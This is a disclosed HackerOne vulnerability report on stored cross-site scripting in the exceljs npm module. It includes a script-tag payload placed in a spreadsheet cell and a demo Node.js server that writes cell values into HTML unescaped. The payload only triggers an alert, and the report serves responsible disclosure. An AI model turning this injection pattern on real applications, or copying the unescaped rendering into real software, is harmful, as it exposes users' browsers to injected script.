# [exceljs] Possible XSS via cell value when worksheet is displayed in browser

## Report Details
- **Report ID**: 356809
- **URL**: https://hackerone.com/reports/356809
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-05-24T13:39:32.401Z
- **Disclosed**: 2018-09-01T19:54:41.794Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Team,

I would like to report Stored XSS vulnerability in exceljs module.
It allows to execute JavaScript code embeded in the XLS sheet when data from the sheet are displayed in the browser.

## Module
module name: exceljs
version: 1.4.6
npm page: https://www.npmjs.com/package/exceljs

### Module Description

Read, manipulate and write spreadsheet data and styles to XLSX and JSON.

Reverse engineered from Excel spreadsheet files as a project.

### Module Stats
~18k weekly downloads (estimated ~72k monthly downloads)

## Vulnerability

### Vulnerability Description
```exceljs``` does not validate data from parsed XLSX file and allows to embed HTML tags, like ```<script>```, directly in the sheet cells. Because of that, I was able to craft malicious JavaScript code and execute it when data from the sheet were displayed in the browser. 

### Steps To Reproduce:

- install exceljs

```
$ npm i exceljs
```

- create sample XLSX file (I've used LibreOffice 5.1.6.2 for Ubuntu) with the sample data. For one of the cell use the following payload:

```
<script>alert(`xss!`)</script>
```

- save the file as testsheet.xlsx


- create sample aplication, which reads,parse and prepare HTML with content of sample XLSX file and save it as app.js:

```javascript
'use strict'
/*global console*/
const Excel = require('exceljs')
const http = require('http')
const port = 8080

const workbook = new Excel.Workbook()
const filename = 'testsheet.xlsx'

function createHTML(worksheet) {
    let __html = `
    <table>
        <tr>
            <td>${worksheet.getCell('A1').value}</td>
            <td>${worksheet.getCell('A2').value}</td>
            <td>${worksheet.getCell('A3').value}</td>
        </tr>
        <tr>
            <td>${worksheet.getCell('B1').value}</td>
            <td>${worksheet.getCell('B2').value}</td>
            <td>${worksheet.getCell('B3').value}</td>
        </tr>
    </table>
    `

    return __html
}

const requestHandler = (request, response) => {
    workbook.xlsx.readFile(filename)
        .then(worksheets => {
            worksheets.eachSheet(function(worksheet, sheetId) {
                response.writeHeader(200, {
                    "Content-Type": "text/html"
                })
                response.write(createHTML(worksheet))
                response.end()
            });
        });
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log(err)
    }
    console.log(`server is listening on ${port}`)
})
```

- run the app

```
$ node app.js
```

- open http://localhost:8080 in the browser


- you will notcie an alert pops up and malicious JavaScript is embeded in page source:

```
    <table>
        <tbody><tr>
            <td><script>alert(`xss!`)</script></td>
            <td>test</td>
            <td>another</td>
        </tr>
        <tr>
            <td>1</td>
            <td>2</td>
            <td>3</td>
        </tr>
    </tbody></table>
```


## Patch

I am aware that due to XLSX files complexity, an implementation of escaping HTML special characters does not resolve the problem here (because ```<```, ```>``` or ```/``` can be used in any other context in XLSX file).

Probably this can be resolved by some kind of escape-on-demand data validation function passed as an optional argument to ```worksheet.getCell()``` function if no special characters are expected in returned value. Blacklisting of ```<script``` or similar well known string also might be an option, but this won't never block attacker in 100% from bypassing such protection.


## Supporting Material/References:

- Ubuntu 16.10
- Node 8.11.1
- npm v.6.0.1
- Chromium 67.0.3388.0 (Developer Build) (64-bit)
- LibreOffice Version: 5.1.6.2 Build ID: 1:5.1.6~rc2-0ubuntu1~xenial3

## Wrap up

I contacted the maintainer to let them know: [N]
I opened an issue in the related repository: [N]

Regards,

Rafal 'bl4de' Janicki

## Impact

If application displays content of the processed XLSX file in the browser, an attacker is able to craft malicious JavaScript payload which will be executed in context of user's browser

## Attachments
No attachments
